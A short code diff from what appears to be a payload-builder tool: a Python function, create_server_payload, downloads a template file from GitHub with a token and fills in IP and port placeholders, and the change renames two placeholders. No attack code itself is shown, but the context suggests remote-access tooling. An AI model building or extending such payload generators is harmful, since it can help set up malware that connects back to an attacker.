@@ -52,7 +52,7 @@ def create_server_payload(ip, port, host_ip, host_port):
         '''
         curl_download_github(f"{temp}\\{filename}.py", str(github_Token), str(server_file))
 
-        with open(f"{temp}\\{filename}.py", 'r+') as f: replace_string = f.read().replace("IP_HERE", ip).replace("PORT_HERE", port).replace("HOST_PORT_HERE", host_port).replace("HOST_IP_HERE", host_ip)
+        with open(f"{temp}\\{filename}.py", 'r+') as f: replace_string = f.read().replace("IP_HERE", ip).replace("PORT_HERE", port).replace("HOST_P_HERE", host_port).replace("HOST_I_HERE", host_ip)
         with open(f"{temp}\\{filename}.py", 'w'): pass
         with open(f"{temp}\\{filename}.py", 'r+') as f: f.write(replace_string)
 
